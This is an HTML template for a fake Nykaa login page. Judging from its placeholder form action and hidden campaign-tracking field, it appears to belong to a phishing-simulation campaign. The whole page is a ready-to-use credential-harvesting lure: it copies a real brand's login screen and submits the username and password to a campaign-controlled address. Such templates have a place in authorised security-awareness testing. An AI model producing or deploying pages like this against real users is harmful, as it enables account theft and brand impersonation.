<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Nykaa Login - Test</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f5f5f5;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }
      .login-container {
        background: #fff;
        padding: 30px 25px;
        border-radius: 10px;
        box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
        width: 100%;
        max-width: 400px;
      }
      h2 {
        color: #ff4081;
        text-align: center;
        margin-bottom: 25px;
      }
      input[type="text"],
      input[type="password"] {
        width: 100%;
        padding: 12px;
        margin: 10px 0;
        border-radius: 5px;
        border: 1px solid #ccc;
        box-sizing: border-box;
      }
      button {
        width: 100%;
        background-color: #ff4081;
        color: #fff;
        padding: 12px;
        border: none;
        border-radius: 5px;
        font-size: 16px;
        cursor: pointer;
        margin-top: 10px;
      }
      button:hover {
        background-color: #e73370;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <h2>Nykaa Login</h2>
      <form method="POST" action="{{.URL}}">
        <!-- Hidden input to track campaign (optional) -->
        <input type="hidden" name="campaign_id" value="{{.CampaignID}}" />
        <input
          type="text"
          name="username"
          placeholder="Enter Email or Mobile"
          required />
        <input
          type="password"
          name="password"
          placeholder="Enter Password"
          required />
        <button type="submit">Login</button>
      </form>
    </div>
  </body>
</html>
